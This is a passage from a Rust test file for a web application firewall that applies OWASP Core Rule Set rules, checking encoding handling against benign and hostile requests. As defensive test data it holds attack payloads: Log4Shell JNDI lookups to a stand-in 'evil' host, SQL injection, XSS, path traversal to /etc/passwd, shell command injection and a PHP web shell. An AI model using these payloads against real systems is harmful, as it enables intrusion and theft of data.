        ctx.body_preview = Bytes::copy_from_slice(p.body.as_bytes());
        for (name, value) in p.headers {
            ctx.headers.insert((*name).to_owned(), (*value).to_owned());
        }
        let dc = DefenseConfig {
            owasp_set: true,
            owasp_paranoia: paranoia,
            ..DefenseConfig::default()
        };
        ctx.host_config = Arc::new(HostConfig {
            code: "test".into(),
            host: "shop.example.com".into(),
            defense_config: dc,
            ..HostConfig::default()
        });
        ctx
    }

    /// The rule id `checker` blocks `p` with, or `None`.
    fn verdict(checker: &OWASPCheck, p: &Probe, paranoia: u8) -> Option<String> {
        checker.check(&probe_ctx(p, paranoia)).and_then(|d| d.rule_id)
    }

    /// Ordinary traffic, every shape that carries a `%` or a `+` for entirely
    /// innocent reasons.
    fn benign_probes() -> &'static [Probe] {
        const JSON_POST: &[(&str, &str)] = &[
            ("content-type", "application/json"),
            ("user-agent", "Mozilla/5.0 (X11; Linux x86_64) Chrome/126.0"),
            ("host", "shop.example.com"),
        ];
        const REFERER_AND_COOKIE: &[(&str, &str)] = &[
            ("user-agent", "Mozilla/5.0 (X11; Linux x86_64) Chrome/126.0"),
            (
                "referer",
                "https://www.google.com/search?q=%E4%B8%AD%E6%96%87+%E5%95%86%E5%93%81&oq=a%2Bb",
            ),
            (
                "cookie",
                "sid=8f3a%2Fb1d%3D%3D; lang=zh%2DCN; cart=%7B%22id%22%3A12%7D; _ga=GA1.2.1.1",
            ),
            ("host", "shop.example.com"),
        ];
        const MULTIPART: &[(&str, &str)] = &[
            (
                "content-type",
                "multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW",
            ),
            ("user-agent", "Mozilla/5.0 (X11; Linux x86_64) Chrome/126.0"),
            ("host", "shop.example.com"),
        ];

        &[
            Probe {
                label: "browser page view",
                method: "GET",
                path: "/products/shoes",
                query: "",
                body: "",
                headers: BROWSER,
            },
            Probe {
                label: "urlencoded form POST (CJK, space, ampersand)",
                method: "POST",
                path: "/account/profile",
                query: "",
                body: "name=%E5%BC%A0%E4%B8%89&note=hello+world+%26+co&city=%E5%8C%97%E4%BA%AC",
                headers: FORM_POST,
            },
            Probe {
                label: "JSON body with escapes and a percent sign",
                method: "POST",
                path: "/api/v1/orders",
                query: "",
                body: r#"{"note":"line1\nline2 \"quoted\" 50%","pct":"100%"}"#,
                headers: JSON_POST,
            },
            Probe {
                label: "encoded redirect_uri in the query",
                method: "GET",
                path: "/oauth/callback",
                query: "redirect=https%3A%2F%2Fexample.com%2Fpath%3Fa%3D1%26b%3D2&state=xyz",
                body: "",
                headers: BROWSER,
            },
            Probe {
                label: "escaped percent sign (q=100%25)",
                method: "GET",
                path: "/search",
                query: "q=100%25&sort=price",
                body: "",
                headers: BROWSER,
            },
            Probe {
                label: "bare, malformed percent (discount=50%)",
                method: "GET",
                path: "/deals",
                query: "discount=50%",
                body: "",
                headers: BROWSER,
            },
            Probe {
                label: "encoded Referer and Cookie",
                method: "GET",
                path: "/cart",
                query: "",
                body: "",
                headers: REFERER_AND_COOKIE,
            },
            Probe {
                label: "multipart upload",
                method: "POST",
                path: "/upload",
                query: "",
                body: "------WebKitFormBoundary7MA4YWxkTrZu0gW\r\nContent-Disposition: form-data; \
                        name=\"file\"; filename=\"report 2026.pdf\"\r\nContent-Type: application/pdf\r\n\r\n%PDF-1.4 \
                        hello\r\n------WebKitFormBoundary7MA4YWxkTrZu0gW--\r\n",
                headers: MULTIPART,
            },
            Probe {
                label: "path with %20 and +",
                method: "GET",
                path: "/files/report%202026%20final+v2.pdf",
                query: "",
                body: "",
                headers: BROWSER,
            },
            Probe {
                label: "path with an escaped hash",
                method: "GET",
                path: "/docs/chapter%231.html",
                query: "",
                body: "",
                headers: BROWSER,
            },
            Probe {
                label: "encoded array indices in the query",
                method: "GET",
                path: "/api/items",
                query: "filter%5B0%5D%5Bfield%5D=name&filter%5B0%5D%5Bop%5D=eq",
                body: "",
                headers: BROWSER,
            },
            Probe {
                label: "encoded array index in the Referer",
                method: "GET",
                path: "/p/1",
                query: "",
                body: "",
                headers: &[
                    ("user-agent", "Mozilla/5.0 (X11; Linux x86_64) Chrome/126.0"),
                    ("referer", "https://shop.example.com/list/tags%5B0%5D/page%202"),
                    ("host", "shop.example.com"),
                ],
            },
            Probe {
                label: "search phrase using + as a space",
                method: "GET",
                path: "/search",
                query: "q=how+to+select+from+a+menu",
                body: "",
                headers: BROWSER,
            },
            Probe {
                label: "plus-addressed email in a form POST",
                method: "POST",
                path: "/subscribe",
                query: "",
                body: "email=user%2Btag%40example.com&msg=A%20%26%20B%20%3C%20C",
                headers: FORM_POST,
            },
            Probe {
                label: "ordinary cookies including a bare 1",
                method: "GET",
                path: "/",
                query: "",
                body: "",
                headers: &[
                    ("user-agent", "Mozilla/5.0 (X11; Linux x86_64) Chrome/126.0"),
                    ("cookie", "consent=1; sid=abc"),
                    ("host", "shop.example.com"),
                ],
            },
            Probe {
                label: "ranged PDF download",
                method: "GET",
                path: "/files/manual.pdf",
                query: "",
                body: "",
                headers: &[
                    ("user-agent", "Mozilla/5.0 (X11; Linux x86_64) Chrome/126.0"),
                    ("range", "bytes=0-1023"),
                    ("host", "shop.example.com"),
                ],
            },
            // ── Deployment shapes, not encoding shapes ───────────────────────
            //
            // Everything above probes a `%` or a `+`.  These probe the traffic
            // this proxy actually sits in front of: a load balancer that
            // appends its own address, and the non-browser clients that make up
            // most API traffic.  They are here because `rules/advanced/`'s SSRF
            // rules block all four (see
            // `advanced_rules_block_ordinary_internal_load_balancer_traffic`),
            // and the shipped CRS set must keep not doing that.
            Probe {
                label: "forwarded by an internal load balancer (RFC1918)",
                method: "GET",
                path: "/products/shoes",
                query: "",
                body: "",
                headers: &[
                    ("user-agent", "Mozilla/5.0 (X11; Linux x86_64) Chrome/126.0"),
                    ("x-forwarded-for", "203.0.113.9, 10.0.1.7"),
                    ("x-forwarded-proto", "https"),
                    ("host", "shop.example.com"),
                ],
            },
            Probe {
                label: "forwarded by a k8s ingress (loopback)",
                method: "GET",
                path: "/api/v1/ping",
                query: "",
                body: "",
                headers: &[
                    ("user-agent", "Mozilla/5.0 (X11; Linux x86_64) Chrome/126.0"),
                    ("x-forwarded-for", "127.0.0.1"),
                    ("x-real-ip", "192.168.1.20"),
                    ("host", "shop.example.com"),
                ],
            },
            Probe {
                label: "API client (curl)",
                method: "GET",
                path: "/api/v1/health",
                query: "",
                body: "",
                headers: &[
                    ("user-agent", "curl/8.5.0"),
                    ("accept", "*/*"),
                    ("host", "shop.example.com"),
                ],
            },
            Probe {
                label: "API client (python-requests) posting JSON",
                method: "POST",
                path: "/api/v1/events",
                query: "",
                body: r#"{"event":"page_view","ts":1699999999}"#,
                headers: &[
                    ("user-agent", "python-requests/2.31.0"),
                    ("content-type", "application/json"),
                    ("host", "shop.example.com"),
                ],
            },
            Probe {
                label: "search-engine crawler",
                method: "GET",
                path: "/products/shoes",
                query: "",
                body: "",
                headers: &[
                    (
                        "user-agent",
                        "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
                    ),
                    ("host", "shop.example.com"),
                ],
            },
        ]
    }

    /// Attacks in both their plain and their percent-encoded spelling.  Before
    /// surface-scoped decoding the encoded column was a clean bypass of the 200+
    /// `regex` conditions the shipped CRS set is almost entirely made of.
    fn attack_probes() -> &'static [(Probe, Option<&'static str>)] {
        // Pinned rule ids only where the encoded form used to slip through
        // entirely; elsewhere any block is enough, because which rule wins
        // depends on file order.
        &[
            (
                Probe {
                    label: "log4shell, encoded",
                    method: "GET",
                    path: "/",
                    query: "x=%24%7Bjndi%3Aldap%3A%2F%2Fevil%2Fa%7D",
                    body: "",
                    headers: BROWSER,
                },
                Some("CRS-944150"),
            ),
            (
                Probe {
                    label: "log4shell, plain",
                    method: "GET",
                    path: "/",
                    query: "x=${jndi:ldap://evil/a}",
                    body: "",
                    headers: BROWSER,
                },
                Some("CRS-944150"),
            ),
            (
                Probe {
                    label: "log4shell, double-encoded",
                    method: "GET",
                    path: "/",
                    query: "x=%2524%257Bjndi%253Aldap%253A%252F%252Fevil%252Fa%257D",
                    body: "",
                    headers: BROWSER,
                },
                Some("CRS-944150"),
            ),
            (
                Probe {
                    label: "PHP stream wrapper, encoded",
                    method: "GET",
                    path: "/index.php",
                    query: "page=php%3A%2F%2Ffilter%2Fconvert.base64-encode%2Fresource%3Dindex",
                    body: "",
                    headers: BROWSER,
                },
                Some("CRS-933140"),
            ),
            (
                Probe {
                    label: "PHP stream wrapper, plain",
                    method: "GET",
                    path: "/index.php",
                    query: "page=php://filter/convert.base64-encode/resource=index",
                    body: "",
                    headers: BROWSER,
                },
                Some("CRS-933140"),
            ),
            (
                Probe {
                    label: "SQLi, encoded",
                    method: "GET",
                    path: "/item",
                    query: "id=1%27%20UNION%20SELECT%20username%2Cpassword%20FROM%20users--",
                    body: "",
                    headers: BROWSER,
                },
                None,
            ),
            (
                Probe {
                    label: "SQLi, plain",
                    method: "GET",
                    path: "/item",
                    query: "id=1' UNION SELECT username,password FROM users--",
                    body: "",
                    headers: BROWSER,
                },
                None,
            ),
            (
                Probe {
                    label: "SQLi in an encoded form body",
                    method: "POST",
                    path: "/login",
                    query: "",
                    body: "user=admin%27%20OR%20%271%27%3D%271&pass=x",
                    headers: FORM_POST,
                },
                None,
            ),
            (
                Probe {
                    label: "XSS, encoded",
                    method: "GET",
                    path: "/",
                    query: "q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E",
                    body: "",
                    headers: BROWSER,
                },
                None,
            ),
            (
                Probe {
                    label: "XSS, plain",
                    method: "GET",
                    path: "/",
                    query: "q=<script>alert(1)</script>",
                    body: "",
                    headers: BROWSER,
                },
                None,
            ),
            (
                Probe {
                    label: "XSS in an encoded cookie",
                    method: "GET",
                    path: "/",
                    query: "",
                    body: "",
                    headers: &[
                        ("user-agent", "Mozilla/5.0 (X11; Linux x86_64) Chrome/126.0"),
                        ("cookie", "theme=%3Cscript%3Ealert%281%29%3C%2Fscript%3E"),
                        ("host", "shop.example.com"),
                    ],
                },
                None,
            ),
            (
                Probe {
                    label: "traversal, encoded path",
                    method: "GET",
                    path: "/static/%2e%2e%2f%2e%2e%2fetc%2fpasswd",
                    query: "",
                    body: "",
                    headers: BROWSER,
                },
                None,
            ),
            (
                Probe {
                    label: "traversal, plain path",
                    method: "GET",
                    path: "/static/../../etc/passwd",
                    query: "",
                    body: "",
                    headers: BROWSER,
                },
                None,
            ),
            (
                Probe {
                    label: "traversal, encoded query",
                    method: "GET",
                    path: "/download",
                    query: "file=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
                    body: "",
                    headers: BROWSER,
                },
                None,
            ),
            (
                Probe {
                    label: "shell command, encoded",
                    method: "GET",
                    path: "/ping",
                    query: "host=127.0.0.1%3Bcat%20%2Fetc%2Fpasswd",
                    body: "",
                    headers: BROWSER,
                },
                None,
            ),
            (
                Probe {
                    label: "shell command, plain",
                    method: "GET",
                    path: "/ping",
                    query: "host=127.0.0.1;cat /etc/passwd",
                    body: "",
                    headers: BROWSER,
                },
                None,
            ),
        ]
    }

    /// Every attack shape is blocked in *both* spellings.  The encoded column
    /// is the regression: `${jndi:` written `%24%7Bjndi%3A` reached the origin
    /// untouched while the identical plain payload was a 403.
    #[test]
    fn percent_encoded_attacks_are_blocked_like_their_plain_form() {
        let checker = OWASPCheck::from_directory(&crs_dir());
        for (probe, pinned) in attack_probes() {
            let hit = verdict(&checker, probe, 1);
            assert!(hit.is_some(), "attack probe not blocked at paranoia 1: {}", probe.label);
            if let Some(expected) = pinned {
                assert_eq!(hit.as_deref(), Some(*expected), "wrong rule fired for {}", probe.label);
            }
        }
    }

    /// The other half of the same change: nothing ordinary started blocking.
    /// Every one of these carries a `%` or a `+` that a naive decode could turn
    /// into an attack-looking string.
    #[test]
    fn ordinary_traffic_carrying_percent_encoding_is_not_blocked() {
        let checker = OWASPCheck::from_directory(&crs_dir());
        for probe in benign_probes() {
            assert_eq!(
                verdict(&checker, probe, 1),
                None,
                "false positive at the default paranoia level: {}",
                probe.label
            );
        }
    }

    /// Paranoia 2 is not the default and is not clean, but its verdicts are
    /// pinned so decoding work cannot quietly add to the list.
    ///
    /// Every entry is accounted for, and after per-parameter `ARGS` none of
    /// them is the "rule scoped to one `ARGS` member, run against a whole
    /// surface" defect any more:
    ///
    /// * **CRS-942200 on `q=how+to+select+from+a+menu`** is genuinely upstream:
    ///   the whole `select … from` pattern sits inside the single `q`
    ///   parameter, so per-parameter evaluation reproduces it exactly.
    /// * **CRS-942131 on the form POST** is new here and is also genuinely
    ///   upstream. `msg=A & B < C` is a `word < word` disequality inside one
    ///   parameter. It appears now only because `ARGS_POST` is finally read:
    ///   the argument-only rules used to be scoped to the query string alone,
    ///   so every one of them could be bypassed by moving the payload into a
    ///   POST body.
    ///
    /// The entry that *did* disappear is the one this change was for: "encoded
    /// array indices in the query" no longer trips CRS-932240, because the
    /// shell-expression pattern was matching across the `&` and `=` separators
    /// of neighbouring parameters.
    ///
    /// **CRS-932240 on the JSON body** and **CRS-932236 on the multipart
    /// upload** left the same way, one change later, and for one reason:
    /// neither rule names `REQUEST_BODY` upstream. Both reach a structured body
    /// only through `XML:/*`, which is empty unless the body *is* XML — so
    /// upstream never showed either of them a JSON document or a MIME envelope,
    /// and the shell-expression pattern that matched across the JSON / MIME
    /// framing was matching a surface this engine had invented. Both rules now
    /// read those bodies the way upstream does, as `ARGS` members produced by
    /// the JSON and multipart body processors, and no single member is a shell
    /// expression.
    ///
    /// The three CRS-920230 entries that used to be here are gone: `@rx
    /// %[0-9a-fA-F]{2}` under `t:none` means "an escape survived the parser",
    /// i.e. double encoding, and now that the query reaches the rule decoded it
    /// says exactly that instead of firing on every singly-encoded value.
    #[test]
    fn paranoia_2_false_positives_stay_at_the_recorded_baseline() {
        let checker = OWASPCheck::from_directory(&crs_dir());
        let expected: &[(&str, Option<&str>)] = &[
            ("search phrase using + as a space", Some("CRS-942200")),
            ("plus-addressed email in a form POST", Some("CRS-942131")),
        ];
        for probe in benign_probes() {
            let want = expected
                .iter()
                .find(|(label, _)| *label == probe.label)
                .and_then(|(_, id)| *id);
            assert_eq!(
                verdict(&checker, probe, 2).as_deref(),
                want,
                "paranoia 2 verdict changed for {}",
                probe.label
            );
        }
    }

    /// The pair of `@contains` rules that no operator-level or surface-level
    /// rule could ever satisfy at the same time.
    ///
    /// CRS-920610 reads `REQUEST_URI_RAW` under `t:none` and fires on a literal
    /// `#`; a *properly escaped* `%23` must stay legal.  CRS-941181 reads
    /// `ARGS` under `t:urlDecodeUni` and must catch `-->` however it is
    /// spelled.  Same operator, opposite requirements — only the rule's own
    /// surface and transformation chain can tell them apart, which is why
    /// `@contains` is no longer special-cased as "raw".
    #[test]
    fn contains_stays_raw_so_an_escaped_hash_is_not_a_raw_fragment() {
        let checker = OWASPCheck::from_directory(&crs_dir());
        let probe = |path: &'static str| Probe {
            label: "hash",
            method: "GET",
            path,
            query: "",
            body: "",
            headers: BROWSER,
        };
        assert_eq!(
            verdict(&checker, &probe("/docs/chapter%231.html"), 1),
            None,
            "an escaped hash is a legal URI, not a raw fragment"
        );
        assert_eq!(
            verdict(&checker, &probe("/docs/chapter#1.html"), 1).as_deref(),
            Some("CRS-920610"),
            "a raw fragment must still be caught"
        );
    }

    /// Header surfaces are matched verbatim, as upstream does.
    ///
    /// CRS-932131 hunts the shell construct `/name[index]` in `User-Agent` /
    /// `Referer`.  Any ordinary Referer holding `%5B0%5D` decodes into exactly
    /// that, so decoding the header would block it — while the plain payload
    /// the rule actually exists for still has to be caught.
    #[test]
    fn header_surfaces_are_matched_verbatim() {
        let checker = OWASPCheck::from_directory(&crs_dir());
        let with_referer = |referer: &'static str| Probe {
            label: "referer",
            method: "GET",
            path: "/p/1",
            query: "",
            body: "",
            headers: match referer {
                "escaped" => &[
                    ("user-agent", "Mozilla/5.0 (X11; Linux x86_64) Chrome/126.0"),
                    ("referer", "https://shop.example.com/list/tags%5B0%5D/page%202"),
                    ("host", "shop.example.com"),
                ],
                _ => &[
                    ("user-agent", "Mozilla/5.0 (X11; Linux x86_64) Chrome/126.0"),
                    ("referer", "https://shop.example.com/list/tags[0]/page 2"),
                    ("host", "shop.example.com"),
                ],
            },
        };
        assert_eq!(
            verdict(&checker, &with_referer("escaped"), 2),
            None,
            "an escaped Referer must not be decoded into a shell expression"
        );
        assert_eq!(
            verdict(&checker, &with_referer("raw"), 2).as_deref(),
            Some("CRS-932131"),
            "the raw shell expression must still be caught"
        );
    }

    /// `ModSecurity` `MATCHED_VARS` and `TX:N` hold the *transformed* value, so
    /// a chain link and a capture must both see the text the head actually
    /// matched — the decoded form, not the bytes off the wire.
    #[test]
    fn chain_links_and_captures_see_the_decoded_text() {
        let capture_rule = "version: \"1.0\"\nrules:\n  - id: TEST-DECODED-CAPTURE\n    name: t\n    \
             category: test\n    severity: critical\n    paranoia: 1\n    field: query\n    \
             operator: regex\n    value: 'alpha (\\w+)'\n    capture: true\n    chain:\n      \
             - field: tx:1\n        operator: equals\n        value: beta\n    action: block\n";
        let checker = OWASPCheck::from_yaml(capture_rule);
        assert_eq!(checker.rule_count(), 1);
        // `q=alpha beta`, percent-encoded. A capture taken from the raw query
        // would not exist at all, because the pattern does not match it.
        assert!(
            checker
                .check(&make_ctx_with_query("q=%61%6c%70%68%61%20beta"))
                .is_some(),
            "tx:1 must carry the capture from the decoded value"
        );

        let matched_rule = "version: \"1.0\"\nrules:\n  - id: TEST-DECODED-MATCHED\n    name: t\n    \
             category: test\n    severity: critical\n    paranoia: 1\n    field: query\n    \
             operator: regex\n    value: alpha\n    chain:\n      - field: matched_value\n        \
             operator: regex\n        value: '^q=alpha beta$'\n    action: block\n";
        let chained = OWASPCheck::from_yaml(matched_rule);
        assert_eq!(chained.rule_count(), 1);
        assert!(
            chained
                .check(&make_ctx_with_query("q=%61%6c%70%68%61%20beta"))
                .is_some(),
            "matched_value must carry the decoded text the head matched"
        );
    }

    /// The allow-list and numeric operators ignore encoding on purpose: a
    /// method token cannot legally carry `%`, `content_length` is an integer
    /// the engine itself renders, and decoding either could only widen what a
    /// deny-by-default comparison rejects.
    #[test]
    fn allowlist_and_numeric_operators_ignore_encoding() {
        let checker = OWASPCheck::from_directory(&crs_dir());
        assert!(
            checker.check(&make_ctx("GET", "/", 0)).is_none(),
            "an allowed method stays allowed"
        );
        for spelled in ["FOOBAR", "%47%45%54", "GET%00"] {
            assert!(
                checker.check(&make_ctx(spelled, "/", 0)).is_some(),
                "{spelled} is not in the CRS-911100 allow-list and must be blocked"
            );
        }
        // CRS-920160: content_length over 10 MB. The value is `u64`-rendered,
        // so there is nothing to decode either way.
        assert!(checker.check(&make_ctx("GET", "/", 10_485_761)).is_some());
        assert!(checker.check(&make_ctx("GET", "/", 1024)).is_none());
    }

    /// The three defects that no surface-level or operator-level approximation
    /// could fix at the same time, now that each rule carries its own `t:`.
    ///
    /// * CRS-920610 — `REQUEST_URI_RAW`, `t:none`: a raw `#` is a fragment, an
    ///   escaped `%23` is an ordinary URL.
    /// * CRS-941181 — `ARGS`, `t:...urlDecodeUni...`: `-->` must be caught
    ///   however it is spelled.  `--%3E` used to sail straight through.
    /// * CRS-920230 — `ARGS`, `t:none`: `%[0-9a-fA-F]{2}` in a value the parser
    ///   has already decoded means *double* encoding.  Run against the raw
    ///   query it fired on every ordinary escape instead.
    #[test]
    fn declared_transformations_decide_what_a_pattern_sees() {
        let checker = OWASPCheck::from_directory(&crs_dir());
        let query = |q: &'static str| {
            let mut ctx = make_ctx_with_query(q);
            ctx.headers.insert("host".to_owned(), "shop.example.com".to_owned());
            ctx
        };

        // CRS-920610: raw surface, no transformation.
        let raw_probe = |path: &'static str| Probe {
            label: "hash",
            method: "GET",
            path,
            query: "",
            body: "",
            headers: BROWSER,
        };
        assert_eq!(verdict(&checker, &raw_probe("/docs/chapter%231.html"), 1), None);
        assert_eq!(
            verdict(&checker, &raw_probe("/docs/chapter#1.html"), 1).as_deref(),
            Some("CRS-920610")
        );

        // CRS-941181: `@contains -->` behind a decode chain.
        for spelling in ["c=-->", "c=--%3E", "c=%2D%2D%3E"] {
            assert!(
                fires(&checker, "CRS-941181", &query(spelling)),
                "CRS-941181 must see through {spelling}"
            );
        }
        assert!(!fires(&checker, "CRS-941181", &query("c=safe")));

        // CRS-920230: double encoding, not "any encoding".
        assert!(
            fires(&checker, "CRS-920230", &query("x=%2525")),
            "a surviving escape is double encoding"
        );
        for ordinary in ["x=100%25", "x=a%20b", "x=%E4%B8%AD%E6%96%87", "x=50%"] {
            assert!(
                !fires(&checker, "CRS-920230", &query(ordinary)),
                "CRS-920230 must not fire on {ordinary}"
            );
        }

        // `t:lowercase` is what makes an all-lower-case CRS pattern meet real
        // mixed-case traffic; CRS-944120's chain needs both halves.
        //
        // Both halves have to be in **one** parameter.  The chain link reads
        // `MATCHED_VARS`, i.e. the value the head matched, so upstream requires
        // one `ARGS` member to carry the gadget name *and* the process-spawn
        // word.  This test used to spread them over two parameters
        // (`cls=InvokerTransformer&cmd=Runtime.exec`) and passed only because
        // the engine handed the rule the whole query string — the very defect
        // per-parameter `ARGS` removes.
        assert!(fires(
            &checker,
            "CRS-944120",
            &query("payload=InvokerTransformer+Runtime.exec")
        ));
        assert!(fires(
            &checker,
            "CRS-944120",
            &query("payload=%49nvokerTransformer+%52untime.exec")
        ));
        assert!(!fires(&checker, "CRS-944120", &query("payload=Harmless+Runtime")));
        // Two parameters no longer satisfy the chain, exactly as upstream.
        assert!(!fires(
            &checker,
            "CRS-944120",
            &query("cls=InvokerTransformer&cmd=Runtime.exec")
        ));
    }

    /// A `t:` the engine cannot perform drops the rule and names itself in the
    /// startup diagnostics.  Silently skipping the step would run the pattern
    /// against a value it was not written for.
    #[test]
    fn an_unimplemented_transformation_rejects_the_rule() {
        let yaml = concat!(
            "version: \"1.0\"\nrules:\n  - id: TEST-T\n    name: t\n    category: test\n",
            "    severity: critical\n    paranoia: 1\n    field: query\n    operator: regex\n",
            "    value: abc\n    transform:\n      - lowercase\n      - sha1\n    action: block\n"
        );
        let checker = OWASPCheck::from_yaml(yaml);
        assert_eq!(checker.rule_count(), 0, "the rule must not be enforced");
        let summary = checker.load_summary();
        assert_eq!(summary.count(RejectCategory::UnsupportedTransformation), 1);
        let rendered = summary
            .rejected
            .first()
            .map(|r| r.reason.to_string())
            .unwrap_or_default();
        assert!(rendered.contains("t:sha1"), "the WARN must name the gap: {rendered}");
        assert!(rendered.contains("head"), "and where it is: {rendered}");
    }

    /// `t:` is an ordered list, not a set.
    #[test]
    fn transformation_order_is_preserved() {
        let rule = |steps: &str| {
            format!(
                concat!(
                    "version: \"1.0\"\nrules:\n  - id: TEST-ORDER\n    name: t\n    category: test\n",
                    "    severity: critical\n    paranoia: 1\n    field: header_referer\n",
                    "    operator: regex\n    value: '^ab$'\n    transform:\n{}    action: block\n"
                ),
                steps
            )
        };
        // `%41` is `A`.  Decoding first and then lower-casing yields `ab`;
        // lower-casing first leaves `%41b`, which the decode turns into `Ab`.
        let ctx = make_ctx_with_header("referer", "%41b");
        let decode_then_lower = OWASPCheck::from_yaml(&rule("      - urlDecodeUni\n      - lowercase\n"));
        let lower_then_decode = OWASPCheck::from_yaml(&rule("      - lowercase\n      - urlDecodeUni\n"));
        assert_eq!(decode_then_lower.rule_count(), 1);
        assert_eq!(lower_then_decode.rule_count(), 1);
        assert!(decode_then_lower.check(&ctx).is_some(), "urlDecodeUni then lowercase");
        assert!(lower_then_decode.check(&ctx).is_none(), "lowercase then urlDecodeUni");
    }

    /// Each transformation against the behaviour `ModSecurity` documents for it.
    #[test]
    fn transformations_match_their_modsecurity_definitions() {
        let chain = |name: &str| {
            TransformChain::compile("test", &[name.to_owned()]).unwrap_or_else(|e| panic!("t:{name}: {e}"))
        };
        let cases: &[(&str, &str, &str)] = &[
            ("lowercase", "AbC", "abc"),
            ("urlDecodeUni", "%3Cscript%3E", "<script>"),
            ("urlDecodeUni", "a+b", "a b"),
            // IIS `%uXXXX`: low byte, with the full-width ASCII fold.
            ("urlDecodeUni", "%u003Cscript", "<script"),
            ("urlDecodeUni", "%uff1cscript", "<script"),
            // Non-strict: a broken escape survives.
            ("urlDecodeUni", "100%25 and 50%", "100% and 50%"),
            ("htmlEntityDecode", "&lt;script&gt;", "<script>"),
            ("htmlEntityDecode", "&#60;&#x3e;", "<>"),
            ("htmlEntityDecode", "&amp&quot", "&\""),
            ("jsDecode", r"\x3cscript\x3e", "<script>"),
            ("jsDecode", r"<b>", "<b>"),
            ("jsDecode", r"al\ert", "alert"),
            ("jsDecode", r"\101\102", "AB"),
            ("cssDecode", r"ex\70 ression", "expression"),
            ("cssDecode", r"\3c script", "<script"),
            // A backslash before a non-hex character simply disappears; before a
            // hex one it starts an escape, so `\e` is `\x0e`, not the letter.
            ("cssDecode", r"ex\pression", "expression"),
            ("cssDecode", r"al\ert", "al\u{0e}rt"),
            ("escapeSeqDecode", r"a\tb\x41", "a\tbA"),
            ("escapeSeqDecode", r"\101", "A"),
            ("utf8toUnicode", "中", "%u4e2d"),
            ("removeNulls", "a\u{0}b", "ab"),
            ("removeWhitespace", " a\tb\nc ", "abc"),
            ("compressWhitespace", "a  \t\n b", "a b"),
            ("replaceComments", "sel/*x*/ect", "sel ect"),
            ("replaceComments", "sel/*unterminated", "sel "),
            ("removeCommentsChar", "sel/*ect--x#y", "selectxy"),
            ("normalizePath", "/a/./b//c", "/a/b/c"),
            ("normalizePath", "/a/b/../c", "/a/c"),
            ("normalizePath", "../a", "../a"),
            ("normalizePathWin", r"\a\.\b\..\c", "/a/c"),
            ("cmdLine", "N\"e\"T   use", "net use"),
            ("cmdLine", "cat ,;/etc/passwd", "cat/etc/passwd"),
            ("base64Decode", "PHNjcmlwdD4=", "<script>"),
            ("length", "abcd", "4"),
        ];
        for (name, input, want) in cases {
            let got = chain(name).apply(input).unwrap_or_else(|| (*input).to_owned());
            assert_eq!(&got, want, "t:{name} on {input:?}");
        }
        // A no-op must stay a no-op: that is what keeps the hot path allocation
        // free, and reporting a change that was not made would defeat it.
        for (name, input) in [
            ("lowercase", "already lower"),
            ("urlDecodeUni", "nothing to decode"),
            ("htmlEntityDecode", "plain text"),
            ("jsDecode", "plain text"),
            ("cssDecode", "plain text"),
            ("normalizePath", "/plain/path"),
            ("removeNulls", "plain"),
            ("compressWhitespace", "a b"),
            ("escapeSeqDecode", "plain text"),
            ("utf8toUnicode", "plain ascii"),
            ("replaceComments", "no comments here"),
        ] {
            assert!(chain(name).apply(input).is_none(), "t:{name} must borrow for {input:?}");
        }
    }

    /// A `multipart/form-data` envelope is not `ARGS`.
    ///
    /// Upstream parses it into `ARGS_POST` / `FILES`; the per-part
    /// `Content-Type:` header never reaches an `ARGS` rule, and handing it over
    /// makes CRS-921120 (`[\n\r]...content-type:`, `t:lowercase`) read every
    /// file upload as a response-splitting attack.
    #[test]
    fn a_multipart_envelope_is_parsed_into_its_parts() {
        let boundary = "----WebKitFormBoundaryABC";
        let upload = |body: &str, paranoia: u8| {
            let mut ctx = make_ctx_with_body(body, paranoia);
            ctx.headers.insert(
                "content-type".to_owned(),
                format!("multipart/form-data; boundary={boundary}"),
            );
            ctx
        };
        let benign = format!(
            "--{boundary}\r\nContent-Disposition: form-data; name=\"file\"; \
             filename=\"report.pdf\"\r\nContent-Type: application/pdf\r\n\r\n%PDF-1.4 hello\r\n\
             --{boundary}--\r\n"
        );
        let ctx = upload(&benign, 2);
        let view = RequestView::new(&ctx);
        assert_eq!(
            view.body.as_ref(),
            "file\nreport.pdf",
            "the quoted parameter values, not the envelope and not the file's content"
        );

        let checker = OWASPCheck::from_directory(&crs_dir());
        assert!(
            !fires(&checker, "CRS-921120", &ctx),
            "an ordinary upload is not a response-splitting attack"
        );

        // A payload really inside a part is still seen.
        let hostile = format!(
            "--{boundary}\r\nContent-Disposition: form-data; name=\"c\"\r\n\r\n\
             <?php system($_GET['c']); ?>\r\n--{boundary}--\r\n"
        );
        assert!(
            checker.check(&upload(&hostile, 1)).is_some(),
            "a web shell in a part payload must still be caught"
        );
        // So is one hidden in a part's file name, which upstream reads through
        // `FILES_NAMES`.
        let traversal = format!(
            "--{boundary}\r\nContent-Disposition: form-data; name=\"f\"; \
             filename=\"../../etc/passwd\"\r\n\r\nx\r\n--{boundary}--\r\n"
        );
        assert!(
            checker.check(&upload(&traversal, 1)).is_some(),
            "a traversal file name must still be caught"
        );
    }

    /// A `POST` of `body` as `multipart/form-data`, evaluated at `paranoia`.
    fn multipart_ctx(boundary: &str, body: &str, paranoia: u8) -> RequestCtx {
        let mut ctx = make_ctx_with_body(body, paranoia);
        ctx.headers.insert(
            "content-type".to_owned(),
            format!("multipart/form-data; boundary={boundary}"),
        );
        ctx
    }

    /// The `FILES` family reaches the rules that name it, and only those.
    ///
    /// Each of these fires on nothing but a part's file name, which is the
    /// whole reason the surface exists: CRS-933110's pattern is
    /// `.*\.ph(?:p\d*|tml|ar|ps|t|pt)\.*$`, and the only faithful reading of it
    /// is "the uploaded file is called `x.php`". Run against any wider surface
    /// it says "the request mentions a `.php` anywhere", which is every request
    /// to a PHP site.
    #[test]
    fn the_files_surfaces_back_the_upload_name_rules() {
        let checker = OWASPCheck::from_directory(&crs_dir());
        let upload = |disposition: &str, paranoia: u8| {
            let body = format!("--b\r\nContent-Disposition: form-data; {disposition}\r\n\r\nx\r\n--b--\r\n");
            multipart_ctx("b", &body, paranoia)
        };

        for (id, disposition, paranoia) in [
            // `FILES`: the file name itself.
            ("CRS-933110", "name=\"f\"; filename=\"shell.php\"", 1),
            ("CRS-944140", "name=\"f\"; filename=\"shell.jsp\"", 1),
            ("CRS-932180", "name=\"f\"; filename=\".htaccess\"", 1),
